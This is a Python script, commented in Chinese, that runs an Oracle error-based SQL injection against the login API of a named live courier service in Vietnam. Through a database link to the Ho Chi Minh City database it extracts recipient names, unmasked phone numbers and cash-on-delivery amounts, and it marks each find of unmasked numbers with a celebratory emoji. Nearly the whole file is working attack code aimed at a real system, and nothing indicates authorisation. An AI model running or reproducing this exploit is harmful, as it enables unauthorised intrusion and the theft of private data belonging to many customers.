#!/usr/bin/env python3
"""
详细检查EMSHCM数据库（胡志明市数据库）
"""

import requests
import json
import time

class EMSHCMChecker:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def check_emshcm_tables(self):
        """检查EMSHCM数据库的表"""
        print("=" * 80)
        print("🔍 检查 EMSHCM 数据库")
        print("=" * 80)
        
        dblink = 'EMSHCM'
        date = '20251010'
        
        # 测试连接
        print(f"\n测试连接...")
        query_test = f"SELECT 1 FROM DUAL@{dblink}"
        result = self.extract_via_error(query_test)
        
        if not result:
            print(f"❌ 无法连接")
            return
        
        print(f"✅ 连接成功")
        
        # 查询E1E2_PH表
        print(f"\n{'='*80}")
        print(f"表: E1E2_PH@{dblink}")
        print(f"{'='*80}")
        
        queries = [
            ("10月10日总记录", f"SELECT COUNT(*) FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}'"),
            ("有电话记录", f"SELECT COUNT(*) FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL"),
            ("未脱敏电话", f"SELECT COUNT(*) FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}' AND DIENTHOAINHAN NOT LIKE '%+%' AND DIENTHOAINHAN NOT LIKE '%x%' AND LENGTH(DIENTHOAINHAN)>=10 AND SUBSTR(DIENTHOAINHAN,1,1)='0'"),
            ("独立MABC", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}'"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
                
                # 如果有未脱敏电话，获取样本
                if name == "未脱敏电话" and result != '0':
                    print(f"\n   🎉 找到未脱敏电话！获取样本...")
                    
                    time.sleep(2)
                    query_sample = f"SELECT MABC||'|'||NGUOINHAN||'|'||DIENTHOAINHAN||'|'||SO_TIEN_THU_HO FROM (SELECT * FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}' AND DIENTHOAINHAN NOT LIKE '%+%' AND LENGTH(DIENTHOAINHAN)>=10) WHERE ROWNUM<=5"
                    samples = self.extract_via_error(query_sample)
                    
                    if samples:
                        print(f"   样本: {samples}")
            time.sleep(2)
        
        # 获取普通样本
        print(f"\n样本数据（前3条）:")
        query_sample = f"SELECT MABC||'|'||NGUOINHAN||'|'||DIENTHOAINHAN FROM (SELECT * FROM EMS.E1E2_PH@{dblink} WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL) WHERE ROWNUM<=3"
        samples = self.extract_via_error(query_sample)
        
        if samples:
            parts = samples.split('|')
            if len(parts) >= 3:
                print(f"  MABC: {parts[0]}")
                print(f"  姓名: {parts[1]}")
                print(f"  电话: {parts[2]}")
                
                # 判断是否脱敏
                if parts[2]:
                    if '+' not in parts[2] and 'x' not in parts[2] and len(parts[2]) >= 10:
                        print(f"  ✅ 这是真实电话！")
                    else:
                        print(f"  ❌ 脱敏数据")
        
        time.sleep(2)
        
        # 检查SHIPMENT表
        print(f"\n{'='*80}")
        print(f"表: SHIPMENT@{dblink}")
        print(f"{'='*80}")
        
        queries2 = [
            ("10月10日记录", f"SELECT COUNT(*) FROM EMS.SHIPMENT@{dblink} WHERE CREATE_DATE='{date}'"),
            ("未脱敏电话", f"SELECT COUNT(*) FROM EMS.SHIPMENT@{dblink} WHERE CREATE_DATE='{date}' AND RECEIVER_PHONE NOT LIKE '%+%' AND RECEIVER_PHONE NOT LIKE '%x%' AND LENGTH(RECEIVER_PHONE)>=10"),
        ]
        
        for name, query in queries2:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   {result}")
                
                if name == "未脱敏电话" and result != '0':
                    print(f"\n   🎉 SHIPMENT有真实电话！获取样本...")
                    
                    time.sleep(2)
                    query_sample = f"SELECT CODE||'|'||RECEIVER_NAME||'|'||RECEIVER_PHONE FROM (SELECT * FROM EMS.SHIPMENT@{dblink} WHERE CREATE_DATE='{date}' AND RECEIVER_PHONE NOT LIKE '%+%' AND LENGTH(RECEIVER_PHONE)>=10) WHERE ROWNUM<=5"
                    samples = self.extract_via_error(query_sample)
                    
                    if samples:
                        print(f"   样本: {samples}")
            time.sleep(2)
        
        # SHIPMENT样本
        print(f"\nSHIPMENT样本:")
        query_sample2 = f"SELECT CODE||'|'||RECEIVER_NAME||'|'||RECEIVER_PHONE FROM (SELECT * FROM EMS.SHIPMENT@{dblink} WHERE CREATE_DATE='{date}' AND RECEIVER_PHONE IS NOT NULL) WHERE ROWNUM<=3"
        samples2 = self.extract_via_error(query_sample2)
        
        if samples2:
            print(f"  {samples2}")
    
    def check_other_tables_in_emshcm(self):
        """检查EMSHCM的其他表"""
        print("\n" + "=" * 80)
        print("📋 检查EMSHCM的其他解密相关表")
        print("=" * 80)
        
        dblink = 'EMSHCM'
        date = '20251010'
        
        tables = [
            ('E1E2_PH_DECRYPT_DATA', 'DIENTHOAINHAN', 'NGAY'),
            ('E1E2_PH_TEMP_DATA2_LOG', 'DIENTHOAINHAN', 'NGAY'),
            ('E1E2_PH_LOG', 'DIENTHOAINHAN', 'NGAY'),
            ('DONHANG', 'DIENTHOAINHAN', 'NGAYTAO'),
        ]
        
        for table, phone_field, date_field in tables:
            print(f"\n{'='*80}")
            print(f"表: {table}@{dblink}")
            print(f"{'='*80}")
            
            # 检查记录数
            query_count = f"SELECT COUNT(*) FROM EMS.{table}@{dblink} WHERE {date_field}='{date}'"
            count = self.extract_via_error(query_count)
            
            if count and count != '0':
                print(f"  📊 10月10日记录: {count}")
                
                time.sleep(1)
                
                # 检查未脱敏电话
                query_real = f"SELECT COUNT(*) FROM EMS.{table}@{dblink} WHERE {date_field}='{date}' AND {phone_field} NOT LIKE '%+%' AND {phone_field} NOT LIKE '%x%' AND LENGTH({phone_field})>=10"
                real_count = self.extract_via_error(query_real)
                
                if real_count:
                    print(f"  📞 未脱敏电话: {real_count}")
                    
                    if real_count != '0':
                        print(f"  🎉 找到真实电话！")
                        
                        time.sleep(1)
                        query_sample = f"SELECT MABC||'|'||{phone_field} FROM EMS.{table}@{dblink} WHERE {date_field}='{date}' AND {phone_field} NOT LIKE '%+%' AND LENGTH({phone_field})>=10 AND ROWNUM<=3"
                        sample = self.extract_via_error(query_sample)
                        
                        if sample:
                            print(f"  样本: {sample}")
            else:
                print(f"  无10月10日数据或表不存在")
            
            time.sleep(2)
    
    def list_all_tables_in_emshcm(self):
        """列出EMSHCM所有表"""
        print("\n" + "=" * 80)
        print("📋 列出EMSHCM所有可用表")
        print("=" * 80)
        
        dblink = 'EMSHCM'
        
        # 获取表列表
        query = f"SELECT TABLE_NAME FROM ALL_TABLES@{dblink} WHERE OWNER='EMS' AND ROWNUM<=30"
        tables = self.extract_via_error(query)
        
        if tables:
            print(f"\nEMS schema的表:")
            print(f"  {tables}")
    
    def run_check(self):
        """执行检查"""
        print("=" * 80)
        print("🌐 检查EMSHCM数据库（胡志明市）")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        self.check_emshcm_tables()
        self.check_other_tables_in_emshcm()
        self.list_all_tables_in_emshcm()
        
        print("\n" + "=" * 80)
        print("🎉 检查完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    checker = EMSHCMChecker(target_url)
    checker.run_check()
